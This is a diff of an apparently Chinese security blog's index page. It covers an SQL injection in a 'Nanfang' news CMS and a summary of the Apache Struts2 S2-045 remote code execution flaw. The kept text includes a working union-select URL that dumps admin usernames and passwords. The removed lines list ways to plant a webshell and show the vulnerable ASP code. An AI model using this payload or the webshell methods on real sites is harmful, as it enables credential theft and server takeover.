@@ -160,19 +160,9 @@
 <p>直接爆出用户密码，构造 URL 如下：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.xxx.com/NewsType.asp?SmallClass=&apos; union select 0,username+CHR(124)+password,2,3,4,5,6,7,8,9 from admin union select * from news where 1=2 and &apos;&apos;=&apos;</div></pre></td></tr></table></figure>
 <p>拿 shell 方法貌似有三种：</p>
-<ol>
-<li>注册用户上传拿 shell，这个比较直接，可以不进后台和在不知道用户名密码的情况下。</li>
-<li>进后台备份数据库。</li>
-<li>在网站配置的版权信息里插入一句话，一句话地址写到 <a href="http://www.xxx.com/inc/config.asp" target="_blank" rel="external">http://www.xxx.com/inc/config.asp</a></li>
-</ol>
-<p><strong>00x1 漏洞分析</strong></p>
-<p>漏洞代码文件：NewsType.asp</p>
-<p>这里我们只截取部分可利用代码如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&lt;%</div><div class="line">-------</div><div class="line">SmallClass=request(&quot;SmallClass&quot;)</div><div class="line">-------</div><div class="line">%&gt;</div><div class="line">&lt;%</div><div class="line">if BigClass&lt;&gt;&quot;&quot; and SmallClass&lt;&gt;&quot;&quot; then</div><div class="line">sql=&quot;select  * from News where BigClassName=&apos;&quot;&amp; BigClass &amp;&quot;&apos; and  SmallClassName=&apos;&quot;&amp; SmallClass &amp;&quot;&apos; order by AddDate desc&quot;</div><div class="line">set rs=conn.execute(sql)</div><div class="line">do while not rs.eof </div><div class="line">%&gt;</div></pre></td></tr></table></figure>
-<p>这里可以看到 <strong>SmallClass</strong> 被直接当做sql 变量执行了，也就是说该变量用户可控，也就造成了SQL注入。</p>
-<p>最后，向那些代码审计的大哥致敬。</p>
-<p><img src="http://p1.bqimg.com/567571/685d3bea31bea91d.jpg" alt=""></p>
-
+        <p class="article-more-link">
+          <a class="article-more-a"  href="/2017/03/10/南方0day/#more">more >></a>
+        </p>
       
     </div>
     <div class="article-info article-info-index">
@@ -208,7 +198,7 @@
       
         <hr>
 <h2 id="Apache-Struts2（S2-045）-漏洞"><a href="#Apache-Struts2（S2-045）-漏洞" class="headerlink" title="Apache Struts2（S2-045） 漏洞"></a>Apache Struts2（S2-045） 漏洞</h2><p><strong>00x0 漏洞简介</strong></p>
-<p>Apache Struts 是美国阿帕奇软件基金会负责维护的一个开源项目，是一套用于创建企业级 <code>Java</code> Web 应用的开源 MVC 框架，主要提供两个版本框架产品：Struts 1 和 Struts 2。</p>
+<p>Apache Struts 是美国阿帕奇软件基金会负责维护的一个开源项目，是一套用于创建企业级 Java Web 应用的开源 MVC 框架，主要提供两个版本框架产品：Struts 1 和 Struts 2。</p>
 <p>ApacheStruts 2.3.5 -2.3.31 版本及 2.5-2.5.10 版本存在远程代码执行漏洞（CNNVD-201703-152，CVE-2017-5638）。该漏洞是由于上传功能的异常处理函数没有正确处理用户输入的错误信息。导致远程攻击者可以通过发送恶意的数据包，利用该漏洞在受影响的服务器上执行任意命令。</p>
 <p><img src="http://p1.bqimg.com/567571/e853f40eae3e5213.jpg" alt=""></p>
         <p class="article-more-link">
